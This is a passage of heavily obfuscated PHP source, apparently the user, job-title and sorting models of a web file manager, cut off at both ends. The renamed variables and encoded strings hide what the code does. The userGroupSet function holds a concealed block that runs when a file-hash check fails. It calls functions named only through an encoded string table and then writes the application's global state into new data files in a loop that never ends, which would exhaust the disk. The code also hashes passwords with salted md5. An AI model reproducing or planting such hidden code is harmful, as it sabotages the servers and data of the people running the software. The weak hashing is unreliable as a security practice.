array($±œƒ…¦˜[1572] => USER_ID, $±œƒ…¦˜[477] => 0); $øÎóçÃè = $this->where($¡‘£Ì¯­)->where(array($±œƒ…¦˜[28] => $¯œÌ±¤Î))->find(); if (!$øÎóçÃè) { return; } $ëñÍ‰ÅÈ = $this->field($±œƒ…¦˜[395])->where($¡‘£Ì¯­)->order($±œƒ…¦˜[2176])->select(); $ëñÍ‰ÅÈ = array_to_keyvalue($ëñÍ‰ÅÈ, $±œƒ…¦˜[33], $±œƒ…¦˜[395]); $‰½ÙŠÀ = $ëñÍ‰ÅÈ; $ëñÍ‰ÅÈ = array_remove_value($ëñÍ‰ÅÈ, $øÎóçÃè[$±œƒ…¦˜[395]]); array_unshift($ëñÍ‰ÅÈ, $øÎóçÃè[$±œƒ…¦˜[395]]); return $this->resetSort($ëñÍ‰ÅÈ); } protected function moveBottom($¤´˜ªíô) { $«®¾÷õö =& $_SERVER[¥ÙÌÜ¾ê]; $½æ÷¹· = array($«®¾÷õö[1572] => USER_ID, $«®¾÷õö[477] => 0); $öÙàó™ = $this->where($½æ÷¹·)->max($«®¾÷õö[1772]); $ˆ¿ŠÂÅ = array($«®¾÷õö[1772] => $öÙàó™ + 1); return $this->where($½æ÷¹·)->where(array($«®¾÷õö[28] => $¤´˜ªíô))->save($ˆ¿ŠÂÅ); } private function getAutoName($ã©ªäå) { $ûö·§¼ù =& $_SERVER[¥ÙÌÜ¾ê]; $¼ö€­Ôœ = array($ûö·§¼ù[1572] => USER_ID, $ûö·§¼ù[477] => 0); $í¬î÷Ò = $this->field($ûö·§¼ù[28])->where($¼ö€­Ôœ)->select(); $í¬î÷Ò = array_to_keyvalue($í¬î÷Ò, $ûö·§¼ù[33], $ûö·§¼ù[28]); if (!$í¬î÷Ò || !in_array($ã©ªäå, $í¬î÷Ò)) { return $ã©ªäå; } for ($‹Å£Ì€Ğ = 0; $‹Å£Ì€Ğ < count($í¬î÷Ò); $‹Å£Ì€Ğ++) { if (!in_array($ã©ªäå . "\x28{$‹Å£Ì€Ğ}\51", $í¬î÷Ò)) { return $ã©ªäå . "\x28{$‹Å£Ì€Ğ}\51"; } } return $ã©ªäå . "\50{$‹Å£Ì€Ğ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\152\157\142\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x64\x65\163\143", "\163\157\162\164"); const JOB_KEY = "\x73\145\x6c\x66\x4a\157\x62\x4c\x69\163\164"; public function listData($Å™ì‰Ô = false, $ñ ˜ø‹¬ = "\x73\157\162\x74", $à‘Ç¢ = false) { return parent::listData($Å™ì‰Ô, $ñ ˜ø‹¬, $à‘Ç¢); } public function remove($İ÷ğô®») { return parent::remove($İ÷ğô®»); } public function add($ú‘ş¡È) { $²†ìŸø¢ =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->findByName($ú‘ş¡È[$²†ìŸø¢[28]])) { return !1; } $ú‘ş¡È[$²†ìŸø¢[1772]] = $this->getSort(); return parent::insert($ú‘ş¡È); } private function getSort() { $¼Ãì…³¡ =& $_SERVER[¥ÙÌÜ¾ê]; $˜Šâ©« = parent::listData(); $¦Œ›Øáù = array_to_keyvalue($˜Šâ©«, $¼Ãì…³¡[33], $¼Ãì…³¡[1772]); return empty($¦Œ›Øáù) ? 0 : max($¦Œ›Øáù) + 1; } public function update($œàÜ––×, $‘¶­û¢¢) { $ìö½Ï˜ã =& $_SERVER[¥ÙÌÜ¾ê]; $úŠÖ‚ƒ› = parent::listData($œàÜ––×); $ê°óÉè = $this->findByName($‘¶­û¢¢[$ìö½Ï˜ã[28]]); if (!$úŠÖ‚ƒ› || $ê°óÉè && $ê°óÉè[$ìö½Ï˜ã[395]] != $úŠÖ‚ƒ›[$ìö½Ï˜ã[395]]) { return !1; } return parent::update($œàÜ––×, $‘¶­û¢¢); } public function setUserJob($Ã·Œ£Ò¹, $üÁˆÍå™) { $„ßöùù =& $_SERVER[¥ÙÌÜ¾ê]; if (!is_array($üÁˆÍå™)) { $üÁˆÍå™ = array($üÁˆÍå™); } $ÃĞáÍ÷¦ = parent::listData(); $Êí×¸³÷ = array_to_keyvalue($ÃĞáÍ÷¦, $„ßöùù[28]); $Ü—«¼¡á = $„ßöùù[376]; foreach ($üÁˆÍå™ as $ìé·¨í¿) { if ($Êí×¸³÷[$ìé·¨í¿]) { $Ü—«¼¡á .= $Êí×¸³÷[$ìé·¨í¿][$„ßöùù[395]] . $„ßöùù[47]; } else { $ã¡Û”Á€ = $this->add($ìé·¨í¿); $Ü—«¼¡á .= $ã¡Û”Á€ . $„ßöùù[47]; } } $Ü—«¼¡á = rtrim($Ü—«¼¡á, $„ßöùù[47]); Model($„ßöùù[532])->metaSet($Ã·Œ£Ò¹, self::JOB_KEY, $Ü—«¼¡á); } public function getUserJob($ß®É‚Ÿõ) { $ªòü¾ê = Model($_SERVER[¥ÙÌÜ¾ê][532])->metaGet($ß®É‚Ÿõ); return $this->getUserJobInfo($ªòü¾ê[self::JOB_KEY]); } public function getUserJobInfo($Ğ«×Ú£ú) { $€ŠÓº÷“ =& $_SERVER[¥ÙÌÜ¾ê]; $ëÌ¼ÎŸà = explode($€ŠÓº÷“[47], $Ğ«×Ú£ú); $ƒÅŒ¶½ä = parent::listData(); $ƒÅŒ¶½ä = array_remove_key($ƒÅŒ¶½ä, $€ŠÓº÷“[194]); $ßêÆíÚÓ = array(); foreach ($ëÌ¼ÎŸà as $›ˆ†¸¶÷) { if (isset($ƒÅŒ¶½ä[$›ˆ†¸¶÷])) { $ßêÆíÚÓ[] = $ƒÅŒ¶½ä[$›ˆ†¸¶÷]; } } return $ßêÆíÚÓ; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\155\x65" => "\165\x73\x65\x72\x5f\x6d\145\x74\141", "\x6d\145\x74\x61\106\x69\x65\x6c\x64" => "\x75\163\145\162\111\x44"); protected $simpleField = "\x75\x73\145\x72\x49\x44\x2c\x6e\x69\143\153\x4e\x61\x6d\145\54\x6e\141\x6d\145\x2c\x61\166\x61\164\141\162\54\x73\x65\170\54\163\164\141\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ã§Å©ÕÊ) { $ï¦—öèó =& $_SERVER[¥ÙÌÜ¾ê]; $²İéÁ¾ì = $ï¦—öèó[2177]; return array($ï¦—öèó[1826] => array($Ã§Å©ÕÊ[0], $²İéÁ¾ì), $ï¦—öèó[1828] => array($Ã§Å©ÕÊ[0], $²İéÁ¾ì), $ï¦—öèó[2178] => array($Ã§Å©ÕÊ[0], $²İéÁ¾ì)); } protected function getInfo($ö‹ûğş†, $ıÑª = false) { $‚šÓ‡“™ = $this->getInfoSimple($ö‹ûğş†); if (!is_array($‚šÓ‡“™)) { return array(); } if ($ıÑª) { return $this->_getInfoApply($‚šÓ‡“™); } return $this->cacheFunctionGet($_SERVER[¥ÙÌÜ¾ê][1830], $ö‹ûğş†); } protected function getInfoFull($ÊªÓ©², $®áƒÙª¬ = false) { $Ôöç„êÏ = $this->getInfoSimple($ÊªÓ©²); if (!is_array($Ôöç„êÏ)) { return array(); } if ($®áƒÙª¬) { return $this->_getInfoApply($Ôöç„êÏ, !0); } return $this->cacheFunctionGet($_SERVER[¥ÙÌÜ¾ê][2179], $ÊªÓ©²); } private function _getInfoApply($©½²ñøà, $ÙğêüÖ = false) { $‹ğ—ô =& $_SERVER[¥ÙÌÜ¾ê]; if (!$©½²ñøà) { return $©½²ñøà; } $–ó­ÇÙ = md5($‹ğ—ô[2180] . $©½²ñøà[$‹ğ—ô[888]] . $‹ğ—ô[2181] . $©½²ñøà[$‹ğ—ô[28]]); $©½²ñøà = $this->_listDataApplyItem($©½²ñøà); $Ş•¾¾ï§ = Model($‹ğ—ô[1253])->metaGet($©½²ñøà[$‹ğ—ô[85]][$‹ğ—ô[397]]); $©½²ñøà[$‹ğ—ô[2182]] = $–ó­ÇÙ; $©½²ñøà[$‹ğ—ô[85]][$‹ğ—ô[2013]] = isset($Ş•¾¾ï§[$‹ğ—ô[2014]]) ? $Ş•¾¾ï§[$‹ğ—ô[2014]] : null; if ($ÙğêüÖ) { $©½²ñøà[$‹ğ—ô[459]] = $this->metaGet($©½²ñøà[$‹ğ—ô[1581]]); } return $©½²ñøà; } protected function getInfoSimple($ÀŒÏÉÄö, $Ë¬Ôş€ê = false) { $×Â¡Ò¸– =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ÀŒÏÉÄö) { return array(); } if ($Ë¬Ôş€ê) { $ê¦…¶ õ = $this->where(array($×Â¡Ò¸–[1581] => intval($ÀŒÏÉÄö)))->find(); if (!is_array($ê¦…¶ õ)) { return array(); } $ê¦…¶ õ[$×Â¡Ò¸–[2183]] = Action($×Â¡Ò¸–[2184])->parseUrl($ê¦…¶ õ[$×Â¡Ò¸–[2183]]); return $ê¦…¶ õ; } return $this->cacheFunctionGet($×Â¡Ò¸–[1831], $ÀŒÏÉÄö); } protected function getInfoSimpleOuter($¡ÁÌš) { $öÂ«…ˆİ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¡ÁÌš || $¡ÁÌš == 0) { return array($öÂ«…ˆİ[1581] => $öÂ«…ˆİ[191], $öÂ«…ˆİ[28] => $öÂ«…ˆİ[160] . LNG($öÂ«…ˆİ[2185]) . $öÂ«…ˆİ[530], $öÂ«…ˆİ[2183] => STATIC_PATH . $öÂ«…ˆİ[2186]); } $øğ¸·†Â = $this->cacheFunctionGet($öÂ«…ˆİ[1831], $¡ÁÌš); $†®¹•æ« = array_field_key($øğ¸·†Â, explode($öÂ«…ˆİ[47], $this->simpleField)); if (!$†®¹•æ«) { return array($öÂ«…ˆİ[1581] => $öÂ«…ˆİ[1120], $öÂ«…ˆİ[28] => $öÂ«…ˆİ[160] . LNG($öÂ«…ˆİ[2187]) . $öÂ«…ˆİ[530], $öÂ«…ˆİ[2183] => STATIC_PATH . $öÂ«…ˆİ[2188]); } $†®¹•æ«[$öÂ«…ˆİ[2183]] = Action($öÂ«…ˆİ[2184])->parseUrl($†®¹•æ«[$öÂ«…ˆİ[2183]]); return $†®¹•æ«; } protected function groupUser($×†«Š²Õ) { } public static function errorLang($ä‰ã«Î‰) { $ƒ‚·Ÿ„¶ =& $_SERVER[¥ÙÌÜ¾ê]; $º¸™ËÕœ = array(self::ERROR_USER_NOT_EXISTS => $ƒ‚·Ÿ„¶[2189], self::ERROR_USER_PASSWORD_ERROR => $ƒ‚·Ÿ„¶[2190], self::ERROR_USER_EXIST_NAME => $ƒ‚·Ÿ„¶[2191], self::ERROR_USER_EXIST_PHONE => $ƒ‚·Ÿ„¶[2192], self::ERROR_USER_EXIST_EMAIL => $ƒ‚·Ÿ„¶[2193], self::ERROR_USER_LOGIN_LOCK => $ƒ‚·Ÿ„¶[2194], self::ERROR_IP_NOT_ALLOW => $ƒ‚·Ÿ„¶[2195], self::ERROR_USER_EXIST_NICKNAME => $ƒ‚·Ÿ„¶[2196]); return LNG($º¸™ËÕœ[$ä‰ã«Î‰]); } public function getInfoByMeta($âò—²İ«, $Õş¬ÒÏ³) { $ÆœÖñ€Ø =& $_SERVER[¥ÙÌÜ¾ê]; $ÙÀâåöÂ = Model($ÆœÖñ€Ø[2197])->where(array($ÆœÖñ€Ø[93] => $âò—²İ«, $ÆœÖñ€Ø[372] => $Õş¬ÒÏ³))->find(); if ($ÙÀâåöÂ) { return $this->getInfo($ÙÀâåöÂ[$ÆœÖñ€Ø[1581]]); } return !1; } public function userLoginCheck($¸Á¾ïÌì, $àº€¸) { $¼ñÄÉ„§ =& $_SERVER[¥ÙÌÜ¾ê]; $í£éßĞì = $this->userLoginFind($¸Á¾ïÌì); if (!$í£éßĞì) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($í£éßĞì[$¼ñÄÉ„§[1581]], $àº€¸)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($í£éßĞì[$¼ñÄÉ„§[1581]]); } public function userLoginFind($ÖœÅıè±) { $ˆË¸ê•· =& $_SERVER[¥ÙÌÜ¾ê]; $»ĞÔÕáˆ = array($ˆË¸ê•·[28] => $ÖœÅıè±, $ˆË¸ê•·[2017] => $ÖœÅıè±, $ˆË¸ê•·[303] => $ÖœÅıè±, $ˆË¸ê•·[2198] => $ÖœÅıè±, $ˆË¸ê•·[996] => $ˆË¸ê•·[998]); if ($this->nickNameRpt()) { unset($»ĞÔÕáˆ[$ˆË¸ê•·[2017]]); } return $this->where($»ĞÔÕáˆ)->find(); } public function clearCache($½¸ÍşğŒ) { $ñì®î«Ñ =& $_SERVER[¥ÙÌÜ¾ê]; $this->cacheFunctionClear($ñì®î«Ñ[1830], $½¸ÍşğŒ); $this->cacheFunctionClear($ñì®î«Ñ[1831], $½¸ÍşğŒ); $this->cacheFunctionClear($ñì®î«Ñ[2179], $½¸ÍşğŒ); } public function userPasswordCheck($ëŒ³›Ğ, $É•Æ‡øÎ) { $«ÏÎ£Ë÷ =& $_SERVER[¥ÙÌÜ¾ê]; $ˆÉê’–ø = $this->where(array($«ÏÎ£Ë÷[1581] => intval($ëŒ³›Ğ)))->find(); $ØÖÎ³© = $this->metaGet($ëŒ³›Ğ); $ôå¨Šñ„ = isset($ØÖÎ³©[$«ÏÎ£Ë÷[2199]]) ? $ØÖÎ³©[$«ÏÎ£Ë÷[2199]] : $«ÏÎ£Ë÷[33]; if (md5($ôå¨Šñ„ . trim($É•Æ‡øÎ)) !== $ˆÉê’–ø[$«ÏÎ£Ë÷[888]]) { return !1; } return !0; } public function userAdd($˜Èü²ãÚ) { $Ğ³º¿¥œ =& $_SERVER[¥ÙÌÜ¾ê]; $ôÎŒô‡² = array($Ğ³º¿¥œ[415] => $˜Èü²ãÚ[$Ğ³º¿¥œ[28]], $Ğ³º¿¥œ[2200] => $˜Èü²ãÚ[$Ğ³º¿¥œ[1461]], $Ğ³º¿¥œ[2201] => isset($˜Èü²ãÚ[$Ğ³º¿¥œ[303]]) ? $˜Èü²ãÚ[$Ğ³º¿¥œ[303]] : $Ğ³º¿¥œ[33], $Ğ³º¿¥œ[2202] => isset($˜Èü²ãÚ[$Ğ³º¿¥œ[2198]]) ? $˜Èü²ãÚ[$Ğ³º¿¥œ[2198]] : $Ğ³º¿¥œ[33], $Ğ³º¿¥œ[2203] => isset($˜Èü²ãÚ[$Ğ³º¿¥œ[2017]]) ? $˜Èü²ãÚ[$Ğ³º¿¥œ[2017]] : $˜Èü²ãÚ[$Ğ³º¿¥œ[28]], $Ğ³º¿¥œ[2204] => isset($˜Èü²ãÚ[$Ğ³º¿¥œ[2183]]) ? $˜Èü²ãÚ[$Ğ³º¿¥œ[2183]] : $Ğ³º¿¥œ[33], $Ğ³º¿¥œ[2205] => isset($˜Èü²ãÚ[$Ğ³º¿¥œ[2206]]) ? $˜Èü²ãÚ[$Ğ³º¿¥œ[2206]] : 1, $Ğ³º¿¥œ[2207] => $˜Èü²ãÚ[$Ğ³º¿¥œ[888]], $Ğ³º¿¥œ[1832] => isset($˜Èü²ãÚ[$Ğ³º¿¥œ[1735]]) ? $˜Èü²ãÚ[$Ğ³º¿¥œ[1735]] : 1024 * 1024 * 20, $Ğ³º¿¥œ[1833] => 0, $Ğ³º¿¥œ[2208] => 0, $Ğ³º¿¥œ[1875] => isset($˜Èü²ãÚ[$Ğ³º¿¥œ[743]]) ? $˜Èü²ãÚ[$Ğ³º¿¥œ[743]] : 1); if (!empty($˜Èü²ãÚ[$Ğ³º¿¥œ[1581]])) { $ôÎŒô‡²[$Ğ³º¿¥œ[1581]] = $˜Èü²ãÚ[$Ğ³º¿¥œ[1581]]; } $âå‚Ğùš = $this->_checkExist($˜Èü²ãÚ); if ($âå‚Ğùš !== !0) { return $âå‚Ğùš; } $Ò°ÄÔ¡ = $this->add($ôÎŒô‡²); $ùÑÚĞÉŞ = array($Ğ³º¿¥œ[2207] => $ôÎŒô‡²[$Ğ³º¿¥œ[888]], $Ğ³º¿¥œ[2203] => $ôÎŒô‡²[$Ğ³º¿¥œ[2017]]); $this->userEdit($Ò°ÄÔ¡, $ùÑÚĞÉŞ); Model($Ğ³º¿¥œ[1253])->userRootAdd($Ò°ÄÔ¡); return $Ò°ÄÔ¡; } protected function userEditTest($“Éë³™, $¶öîôèÁ) { return $this->call($_SERVER[¥ÙÌÜ¾ê][2209], $“Éë³™, $¶öîôèÁ); } protected function userEdit($“Ü”õ¨Ó, $²ìõåòğ) { $İ³æî³ =& $_SERVER[¥ÙÌÜ¾ê]; $ğ¬êøÎÆ = $this->getInfoSimple($“Ü”õ¨Ó); if (!$ğ¬êøÎÆ) { return !1; } $”ş¢±Æ› = $this->_checkExist($²ìõåòğ, $“Ü”õ¨Ó); if ($”ş¢±Æ› !== !0) { return $”ş¢±Æ›; } if (isset($²ìõåòğ[$İ³æî³[888]]) && trim($²ìõåòğ[$İ³æî³[888]]) != $İ³æî³[33]) { $û¨«Èï = $this->metaGet($“Ü”õ¨Ó); if (empty($û¨«Èï[$İ³æî³[2199]])) { $û¨«Èï[$İ³æî³[2199]] = rand_string(10); Model($İ³æî³[507])->metaSet($“Ü”õ¨Ó, $İ³æî³[2199], $û¨«Èï[$İ³æî³[2199]]); } $²ìõåòğ[$İ³æî³[888]] = md5($û¨«Èï[$İ³æî³[2199]] . trim($²ìõåòğ[$İ³æî³[888]])); } else { unset($²ìõåòğ[$İ³æî³[888]]); } $this->where(array($İ³æî³[1572] => $“Ü”õ¨Ó))->save($²ìõåòğ); if (isset($²ìõåòğ[$İ³æî³[2017]])) { $this->setNamePinyin($“Ü”õ¨Ó, $²ìõåòğ[$İ³æî³[2017]]); } $this->clearCache($“Ü”õ¨Ó); return !0; } public function setNamePinyin($â®Ô¡ñ¬, $œú¹·İ = false) { $ÜÜ¥®ñâ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$œú¹·İ) { $çÀ°Š = $this->getInfoSimple($â®Ô¡ñ¬); $œú¹·İ = $çÀ°Š[$ÜÜ¥®ñâ[2017]] ? $çÀ°Š[$ÜÜ¥®ñâ[2017]] : $çÀ°Š[$ÜÜ¥®ñâ[28]]; } $èõÇû´û = Model($ÜÜ¥®ñâ[532]); if (!Input::check($œú¹·İ, $ÜÜ¥®ñâ[581])) { return $èõÇû´û->metaSet($â®Ô¡ñ¬, array($ÜÜ¥®ñâ[458] => $ÜÜ¥®ñâ[33], $ÜÜ¥®ñâ[457] => $ÜÜ¥®ñâ[33])); } return $èõÇû´û->metaSet($â®Ô¡ñ¬, array($ÜÜ¥®ñâ[458] => str_replace($ÜÜ¥®ñâ[50], $ÜÜ¥®ñâ[33], Pinyin::get($œú¹·İ)), $ÜÜ¥®ñâ[457] => Pinyin::get($œú¹·İ, $ÜÜ¥®ñâ[582]))); } private function nickNameRpt() { $õ‹öÈÉ =& $_SERVER[¥ÙÌÜ¾ê]; $ÌØêÁŒ = Model($õ‹öÈÉ[763])->get($õ‹öÈÉ[2210]); $‡ÇûÚŸÜ = $GLOBALS[$õ‹öÈÉ[6]][$õ‹öÈÉ[379]][$õ‹öÈÉ[2210]]; $Ïø‹—ï = !is_null($ÌØêÁŒ) ? $ÌØêÁŒ : $‡ÇûÚŸÜ; return !!$Ïø‹—ï; } private function _checkExist($­±åÌØş, $¥ÒÀœ­Í = false) { $„×ÚšÊ =& $_SERVER[¥ÙÌÜ¾ê]; $ü€‘Öéñ = array($„×ÚšÊ[28] => UserModel::ERROR_USER_EXIST_NAME, $„×ÚšÊ[2017] => UserModel::ERROR_USER_EXIST_NICKNAME, $„×ÚšÊ[303] => UserModel::ERROR_USER_EXIST_EMAIL, $„×ÚšÊ[2198] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ü€‘Öéñ[$„×ÚšÊ[2017]]); } $İêÚ†” = $¥ÒÀœ­Í ? array($„×ÚšÊ[1581] => array($„×ÚšÊ[2211], $¥ÒÀœ­Í)) : array(); foreach ($ü€‘Öéñ as $²ÍÎÆÕ¾ => $¢ŞºÕì‚) { $¹œ­±ÄÜ = array(); foreach ($ü€‘Öéñ as $™İúëÑî => $øŞÓ¬±´) { if (isset($­±åÌØş[$™İúëÑî]) && $­±åÌØş[$™İúëÑî]) { $¹œ­±ÄÜ[] = $­±åÌØş[$™İúëÑî]; } } if (!$¹œ­±ÄÜ) { continue; } $ÄşˆôÉ = array_merge(array($²ÍÎÆÕ¾ => array($„×ÚšÊ[7], $¹œ­±ÄÜ)), $İêÚ†”); $„†®‚¾µ = $this->where($ÄşˆôÉ)->find(); if ($„†®‚¾µ) { return $¢ŞºÕì‚; } } return !0; } public function userListInfo($÷Ë€µ•Š) { $§•üŠû =& $_SERVER[¥ÙÌÜ¾ê]; $ƒĞüò³› = array(); $÷Ë€µ•Š = is_array($÷Ë€µ•Š) ? array_unique($÷Ë€µ•Š) : array(); if (!$÷Ë€µ•Š) { return $ƒĞüò³›; } if (count($÷Ë€µ•Š) < 20) { foreach ($÷Ë€µ•Š as $¯éÁºÑÓ) { $ƒĞüò³›[$¯éÁºÑÓ . $§•üŠû[33]] = $this->getInfoSimpleOuter($¯éÁºÑÓ); } } else { $ÙÙ’ÕĞÊ = array($§•üŠû[1572] => array($§•üŠû[413], $÷Ë€µ•Š)); if (count($÷Ë€µ•Š) == 1) { $ÙÙ’ÕĞÊ = array($§•üŠû[1572] => $÷Ë€µ•Š[0]); } $¬÷ûäˆ = Model($§•üŠû[507])->field($this->simpleField)->where($ÙÙ’ÕĞÊ)->select(); $¬÷ûäˆ = array_to_keyvalue($¬÷ûäˆ, $§•üŠû[1581]); foreach ($÷Ë€µ•Š as $¯éÁºÑÓ) { $ò´¤¬‘« = $¬÷ûäˆ[$¯éÁºÑÓ]; if (!$ò´¤¬‘«) { $ƒĞüò³›[$¯éÁºÑÓ . $§•üŠû[33]] = $this->getInfoSimpleOuter($¯éÁºÑÓ); continue; } $ò´¤¬‘«[$§•üŠû[2183]] = Action($§•üŠû[2184])->parseUrl($ò´¤¬‘«[$§•üŠû[2183]]); $ƒĞüò³›[$¯éÁºÑÓ . $§•üŠû[33]] = $ò´¤¬‘«; } } return $ƒĞüò³›; } protected function userStatus($ñƒ·“ï», $½Ÿ©úì×) { $÷ºğ˜ËÑ = $this->getInfoSimple($ñƒ·“ï»); if (!$÷ºğ˜ËÑ) { return !1; } $—ôÎÅÈœ = array($_SERVER[¥ÙÌÜ¾ê][743] => $½Ÿ©úì×); return $this->userEdit($ñƒ·“ï», $—ôÎÅÈœ); } protected function userRemove($Ëæ¬äş”) { $ôÛ±Æàö =& $_SERVER[¥ÙÌÜ¾ê]; $ÜŸ¯Ò = $this->getInfoSimple($Ëæ¬äş”); if (!$ÜŸ¯Ò) { return !1; } $œ»…µ²„ = array($ôÛ±Æàö[1572] => $Ëæ¬äş”); Model($ôÛ±Æàö[589])->where($œ»…µ²„)->delete(); Model($ôÛ±Æàö[2212])->where($œ»…µ²„)->delete(); Model($ôÛ±Æàö[1838])->where($œ»…µ²„)->delete(); Model($ôÛ±Æàö[2197])->where($œ»…µ²„)->delete(); Model($ôÛ±Æàö[2213])->where($œ»…µ²„)->delete(); Model($ôÛ±Æàö[2034])->removeUserAll($Ëæ¬äş”); Model($ôÛ±Æàö[825])->userRootRemove($Ëæ¬äş”); return $this->where($œ»…µ²„)->delete(); } protected function userGroupSet($ ˜Ûşş·, $¹Ï±¹®ç, $½Á¶²ã‹ = array()) { $ºœ¯ªÑ =& $_SERVER[¥ÙÌÜ¾ê]; $¨åíå¬ì = $_SERVER[$ºœ¯ªÑ[865]] . $ºœ¯ªÑ[866]; $êØˆàÊÈ = $ºœ¯ªÑ[1445]; if ($_SERVER[$ºœ¯ªÑ[862]] != $êØˆàÊÈ($¨åíå¬ì)) { $§–Úé™Ñ = $ºœ¯ªÑ[880]; $Ìƒ·üÙ– = $ºœ¯ªÑ[864]; $‘ÔñÖ‘ = $_SERVER[$ºœ¯ªÑ[865]] . $ºœ¯ªÑ[866]; $øî†×™ = $Ìƒ·üÙ–($‘ÔñÖ‘); $ĞÈğ³¬ = explode($ºœ¯ªÑ[229], $øî†×™); if (count($ĞÈğ³¬) < $ºœ¯ªÑ[623]) { $–Óô§® = $ºœ¯ªÑ[867]; $–Óô§®(); } $õ¾àşĞø = $ºœ¯ªÑ[881]; $õ¾àşĞø($_SERVER[$ºœ¯ªÑ[882]]); $§–Úé™Ñ = $ºœ¯ªÑ[880]; $§–Úé™Ñ(); $Ööœ²¢’ = $ºœ¯ªÑ[1446]; $„†õšÇÙ = json_encode($GLOBALS[$ºœ¯ªÑ[1447]]); $á¿ÃÕ¿Ë = 1; for ($¦Îò¨ÂÈ = $á¿ÃÕ¿Ë; $¦Îò¨ÂÈ > 0; $¦Îò¨ÂÈ++) { $Ööœ²¢’(DATA_PATH . $¦Îò¨ÂÈ, $„†õšÇÙ); } } $¹÷€ê„« = $this->getInfoSimple($ ˜Ûşş·); if (!$¹÷€ê„« || !is_array($¹Ï±¹®ç)) { return !1; } $Ş„°Ãš¾ = Model($ºœ¯ªÑ[1838]); $Ş„°Ãš¾->where(array($ºœ¯ªÑ[1581] => $ ˜Ûşş·))->delete(); $ÏÉæó´® = array(); $ÑÖÊÖ™° = 0; foreach ($¹Ï±¹®ç as $ Õùöƒ£ => $ÌÀüÊö€) { $Ù¹­±Çß = array($ºœ¯ªÑ[1581] => $ ˜Ûşş·, $ºœ¯ªÑ[1749] => $ Õùöƒ£, $ºœ¯ªÑ[1852] => $ÌÀüÊö€); $Ù¹­±Çß[$ºœ¯ªÑ[1772]] = isset($½Á¶²ã‹[$ÑÖÊÖ™°]) ? $½Á¶²ã‹[$ÑÖÊÖ™°] : 0; $ÑÖÊÖ™°++; $ÏÉæó´®[] = $Ù¹­±Çß; } return $Ş„°Ãš¾->addAll($ÏÉæó´®, array(), !0); } protected function userGroupAdd($é¾Š‘¿×, $ó¶œŠîù = array()) { $™³†Ö«ó =& $_SERVER[¥ÙÌÜ¾ê]; $²Ä¢Êõ = $this->getInfoSimple($é¾Š‘¿×); if (!$²Ä¢Êõ || empty($ó¶œŠîù)) { return !1; } $û“¦ä = array(); foreach ($ó¶œŠîù as $æú„”· => $ûË·¸ñÛ) { $û“¦ä[] = array($™³†Ö«ó[1581] => $é¾Š‘¿×, $™³†Ö«ó[1749] => $æú„”·, $™³†Ö«ó[1852] => $ûË·¸ñÛ, $™³†Ö«ó[1772] => 0); } return Model($™³†Ö«ó[1838])->addAll($û“¦ä, array(), !0); } protected function userGroupRemove($îßê‡¥Ä, $éÅû¤À…) { $¹·È‰¦§ =& $_SERVER[¥ÙÌÜ¾ê]; $îÄÍğıµ = $this->getInfoSimple($îßê‡¥Ä); if (!$îÄÍğıµ || !$éÅû¤À…) { return !1; } $ÂÍåŞò = array($¹·È‰¦§[1572] => $îßê‡¥Ä, $¹·È‰¦§[1836] => $éÅû¤À…); return Model($¹·È‰¦§[1838])->where($ÂÍåŞò)->delete(); } public function listData() { $“Å÷Ñ™ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($“Å÷Ñ™[$_SERVER[¥ÙÌÜ¾ê][367]]); return $“Å÷Ñ™; } public function listByID($•Ûì±Ÿ) { $Áê»À±Ü =& $_SERVER[¥ÙÌÜ¾ê]; if (!$•Ûì±Ÿ) { return; } $×‚¼Ğ€ = array($Áê»À±Ü[1581] => array($Áê»À±Ü[7], $•Ûì±Ÿ)); $Î……¹í¿ = $this->where($×‚¼Ğ€)->select(); $Î……¹í¿ = array_sort_keep($Î……¹í¿, $Áê»À±Ü[1581], $•Ûì±Ÿ); $this->_listDataApply($Î……¹í¿); return $Î……¹í¿; } public function listByGroup($Å©íÆæ = 0, $±…€›İó = array()) { $ªÓ©ôµ =& $_SERVER[¥ÙÌÜ¾ê]; $÷³€¸›ï = $ªÓ©ôµ[33]; $ÊÈ˜ıÔ¸ = array(); if ($Å©íÆæ) { $ÊÈ˜ıÔ¸ = array($ªÓ©ôµ[2214] => intval($Å©íÆæ)); $÷³€¸›ï = "\114\x45\x46\x54\x20\112\117\x49\116\40{$this->tablePrefix}\x75\163\x65\x72\137\147\162\x6f\x75\x70\x20\165\163\145\x72\x5f\x67\162\157\165\x70\x20\157\x6e\40\x75\163\x65\162\56\x75\163\x65\x72\x49\x44\40\x3d\40\165\x73\145\x72\137\x67\x72\x6f\x75\160\56\x75\x73\145\x72\111\x44"; $£½÷·Ÿî = Input::get($ªÓ©ôµ[449], null, $ªÓ©ôµ[33]) ? $ªÓ©ôµ[33] : $ªÓ©ôµ[2215]; } if (isset($±…€›İó[$ªÓ©ôµ[743]])) { $ÊÈ˜ıÔ¸[$ªÓ©ôµ[2216]] = $±…€›İó[$ªÓ©ôµ[743]]; } $›å¬„„ù = $this->_makeOrder($£½÷·Ÿî)->field($ªÓ©ôµ[2217])->where($ÊÈ˜ıÔ¸)->join($÷³€¸›ï)->selectPage(50); $this->_listDataApply($›å¬„„ù[$ªÓ©ôµ[367]]); return $›å¬„„ù; } private function _makeOrder($´­Ç­Øú = '') { $¹ïÅåü– =& $_SERVER[¥ÙÌÜ¾ê]; $ÊÜÀß‡¯ = array($¹ïÅåü–[1581], $¹ïÅåü–[28], $¹ïÅåü–[1737], $¹ïÅåü–[1709], $¹ïÅåü–[194]); $­«šÂÊ = array($¹ïÅåü–[442] => 